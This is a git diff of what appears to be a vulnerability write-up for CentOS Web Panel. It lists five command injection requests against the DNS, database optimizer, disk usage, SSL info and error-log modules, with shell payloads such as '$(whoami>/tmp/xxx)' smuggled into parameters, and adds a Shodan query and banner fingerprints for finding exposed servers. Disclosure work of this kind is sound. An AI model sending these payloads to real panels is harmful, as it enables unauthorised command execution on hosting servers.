@@ -85,25 +85,40 @@ There are several vulnerable modules
 
 1. Adds a new DNS record with a command injection in the name field.
 
-`[POST] /index.php?module=mysql_manager&acc=`optimizerdb`
-`[DATA] namereg=touch /tmp/hello&domain=test.example.com&cachereg=1&valuereg="aGVsbG8="&reg=TXT`
+- [POST] `/index.php?module=mysql_manager&acc=optimizerdb`
+- [DATA] `namereg=touch /tmp/hello&domain=test.example.com&cachereg=1&valuereg="aGVsbG8="&reg=TXT`
 
 2. Optimize database
 
-`[POST] /index.php?module=mysql_manager&acc=`optimizerdb`
-`[DATA] db=test_hello$(whoami>/tmp/xxx)`
+- [POST] `/index.php?module=mysql_manager&acc=`optimizerdb`
+- [DATA] `db=test_hello$(whoami>/tmp/xxx)`
 
 3. Disk usage
 
-`[POST] /index.php?module=disk_usage&acc=load_directory`
-`[DATA] folder_name='/home/<username>/$(id>/tmp/id)'`
+- `[POST] /index.php?module=disk_usage&acc=load_directory`
+- `[DATA] folder_name='/home/<username>/$(id>/tmp/id)'`
 
 4. SSL Certificate Info
 
-`[POST] /index.php?module=letsencrypt&acc=infomodal`
-`[DATA] domain=test.example.com$(whoami>/tmp/www)&type=info`
+- `[POST] /index.php?module=letsencrypt&acc=infomodal`
+- `[DATA] domain=test.example.com$(whoami>/tmp/www)&type=info`
 
 5. Error log viewer
 
-`[POST] index.php?module=error_log&acc=select`
-`[DATA] domain=test.example.com&tipe=access&numline=20&op=select&textsearch=howdy$(id>/tmp/howdy)`
+- `[POST] index.php?module=error_log&acc=select`
+- `[DATA] domain=test.example.com&tipe=access&numline=20&op=select&textsearch=howdy$(id>/tmp/howdy)`
+
+
+
+### Detecting
+
+Shodan
+
+
+https://www.shodan.io/search?query=%22Server%3A+cwpsrv%22
+
+`Set-Cookie: cwpsrv-`
+`Server: cwpsrv`
+
+SSL: |- Organization: 
+CentOS Web Panel
